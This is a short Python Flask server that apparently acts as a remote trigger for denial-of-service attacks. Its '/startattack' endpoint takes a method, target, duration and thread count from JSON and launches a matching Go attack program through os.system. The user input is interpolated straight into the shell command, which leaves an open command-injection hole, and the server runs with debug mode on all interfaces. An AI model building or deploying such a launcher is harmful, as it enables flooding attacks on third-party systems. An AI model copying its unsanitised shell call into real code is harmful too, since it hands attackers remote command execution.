from flask import Flask, request, jsonify
import os
import requests
import json

app = Flask(__name__)

@app.route('/startattack', methods=["POST"])
def attack():
    if request.method == "POST":
        kaka = request.get_json()
        print(request.get_data())
        os.system(f"go run {kaka['method']}.go -target {kaka['target']} -duration {kaka['duration']} -workers {kaka['threads']}")
        print(kaka['method'], kaka['target'], kaka['duration'], kaka['threads'])
        return "succ"

if __name__ == '__main__':
    app.run(host="0.0.0.0",debug=True, port=5000)